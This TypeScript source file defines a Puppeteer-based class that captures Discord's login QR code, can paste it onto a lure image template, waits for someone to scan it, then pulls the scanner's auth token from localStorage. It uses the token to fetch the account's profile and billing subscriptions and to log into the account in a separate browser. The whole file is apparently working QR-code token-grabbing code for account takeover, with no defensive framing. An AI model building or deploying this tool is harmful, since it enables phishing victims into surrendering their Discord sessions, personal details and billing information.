"use strict";

import jimg from "jimg";
import puppeteer, { Browser, Page, PuppeteerLaunchOptions } from "puppeteer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";

import { APIUser } from "discord-api-types/v10";

type DiscordTQRConfig = {
  loginUrl: string;
  discordUserApi: string;
  discordSubscriptionApi: string;
  httpHeader: Record<string, string>;
};

type UserInfo = APIUser & {
  user: string;
  avatar_url: string;
  subscription: BillingSubscriptionsResponse;
};

interface BillingSubscription {
  id: string;
  planId: string;
  status: string;
  currentPeriodStart: string;
  currentPeriodEnd: string;
  created: string;
}

interface BillingSubscriptionsResponse {
  subscriptions: BillingSubscription[];
}

class DiscordTQR {
  private $browser: Browser = null;
  private $page: Page = null;

  public qr: string = null;
  public user: UserInfo = null;

  public config: DiscordTQRConfig = {
    loginUrl: "https://discord.com/login",
    discordUserApi: "https://discord.com/api/v10/users/@me",
    discordSubscriptionApi:
      "https://discordapp.com/api/v10/users/@me/billing/subscriptions",
    httpHeader: {
      accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "user-agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "fr-FR,fr;q=0.9,fr;q=0.8",
    },
  };

  constructor(public token?: string) {}

  /**
   * Create a login QR Code
   * @param options
   * @returns
   */
  async getQRCode(
    options: {
      path?: string;
      browserOptions?: PuppeteerLaunchOptions;
      encoding?: string;
      wait?: number;
      template?:
        | {
            path: string;
            x?: number;
            y?: number;
            width?: number;
            height?: number;
          }
        | "default";
    } = {}
  ): Promise<string> {
    if (typeof options.template === "string" && options.template !== "default")
      throw new Error("Invalide value for 'template'");

    if (this.$browser || this.$page) await this.closeConnection();

    this.$browser = await puppeteer.launch(
      options?.browserOptions
        ? options.browserOptions
        : { headless: "new", defaultViewport: null }
    );

    this.$page = (await this.$browser.pages())[0];

    const page = this.$page;

    await page.setViewport({
      width: 1920,
      height: 1080,
      deviceScaleFactor: 1,
    });

    await page.setExtraHTTPHeaders(this.config.httpHeader);

    await page.goto(this.config.loginUrl, {
      waitUntil: "networkidle2",
    });

    await page.waitForSelector(
      '[class^="qrCode-"] img[src^="data:image/png;base64,"], [class^="qrCode-"] svg'
    );

    if (options?.wait) await new Promise((r) => setTimeout(r, options.wait));

    const qrC = await page.$('[class^="qrCode-"]');

    let data = await qrC.screenshot({
      ...(options.path && !options.template ? { path: options.path } : {}),
      ...(options.encoding ? { path: options.encoding } : {}),
      captureBeyondViewport: false,
    });

    let finalImageBase64 =
      data instanceof Buffer ? data.toString("base64") : data;

    //template
    if (options.template) {
      const tmpFile = path.resolve(__dirname, "./tmp.png");
      fs.writeFileSync(tmpFile, finalImageBase64, "base64");
      const optionsJimg = {
        path: options.path,
        images: [
          {
            path:
              options.template === "default"
                ? path.resolve(__dirname, "../assets/template.png")
                : options.template.path,
          },
          options.template === "default"
            ? {
                path: tmpFile,
                x: 102,
                y: 390,
                width: 200,
                height: 200,
              }
            : { ...options.template, path: tmpFile },
        ],
      };
      finalImageBase64 = await jimg(optionsJimg);
      fs.unlinkSync(tmpFile);
    }

    this.qr = finalImageBase64;

    return finalImageBase64;
  }

  /**
   * Listen for token and return it when the program get it
   * @returns
   */
  async listenForToken(): Promise<string> {
    if (!this.$browser || !this.$page)
      throw new Error("This method need to be launch after 'getQRCode' method");

    const page = this.$page;

    try {
      await page.waitForNavigation({ timeout: 60000 });
    } catch (e) {
      throw new Error(
        "Max time reached (1 minute). The QR code is not valide anymore"
      );
    }

    const token = await page.evaluate(() => {
      window.dispatchEvent(new Event("beforeunload"));
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      document.body.appendChild(iframe);
      const localStorage = iframe.contentWindow.localStorage;
      return JSON.parse(localStorage.token);
    });

    this.token = token;

    return token;
  }

  /**
   * Return informations about the user account from the discord api like email, phone, name...
   * @param token
   * @returns
   */
  async getDiscordAccountInfo(token?: string) {
    token = token ?? this.token;

    if (!token) throw new Error("Invalide token");

    const scrapInfo = await fetch(this.config.discordUserApi, {
      headers: { Authorization: token },
    });
    const info: APIUser = await scrapInfo.json();

    const scrapSub = await fetch(this.config.discordSubscriptionApi, {
      headers: { Authorization: token },
    });
    const sub: BillingSubscriptionsResponse = await scrapSub.json();

    const user: UserInfo = {
      ...info,
      user: info.username + "#" + info.discriminator,
      avatar_url:
        "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar,
      subscription: sub,
    };

    this.user = user;

    return user;
  }

  /**
   * Open the discord account in puppeter and return the browser and page corresponding
   * @param options
   * @returns
   */
  async openDiscordAccount(
    options: {
      token?: string;
      browserOptions?: PuppeteerLaunchOptions;
    } = {}
  ): Promise<{ browser: Browser; page: Page }> {
    const token = options?.token ?? this.token;

    if (!token) throw new Error("Invalide token");

    const browser = await puppeteer.launch(
      options?.browserOptions
        ? options.browserOptions
        : {
            headless: false,
            defaultViewport: null,
          }
    );

    const page = (await browser.pages())[0];

    await page.setExtraHTTPHeaders(this.config.httpHeader);

    await page.goto(this.config.loginUrl, {
      waitUntil: "domcontentloaded",
    });

    await page.evaluate((token: string) => {
      setInterval(() => {
        document.body.appendChild(
          document.createElement("iframe")
        ).contentWindow.localStorage.token = `"${token}"`;
      }, 50);
      setTimeout(() => {
        location.reload();
      }, 2500);
    }, token);

    return { browser, page };
  }

  /**
   * Close the opened browser used to generate QR Code and to listen the token
   */
  async closeConnection() {
    if (this.$browser) {
      const browser = this.$browser;
      await browser.close();
      this.$browser = null;
      this.$page = null;
    }
  }
}

export default DiscordTQR;
